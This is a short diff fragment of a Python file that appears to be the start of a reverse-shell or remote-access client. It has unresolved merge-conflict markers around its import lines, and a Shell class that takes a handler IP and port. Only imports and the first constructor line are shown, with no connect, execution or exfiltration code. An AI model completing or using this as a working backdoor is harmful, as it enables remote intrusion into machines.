@@ -1,4 +1,9 @@
+<<<<<<< HEAD
 import socket, subprocess, os, threading, json, base64, datetime, getpass
+=======
+import socket, subprocess, os, threading, json, base64, win32api, datetime, getpass
+
+>>>>>>> a810364070e12eb46d05e56aaf3d54d198fbd484
 class Shell:
 	def __init__(self, handler_ip, handler_port):
 		self.handler_ip = handler_ip
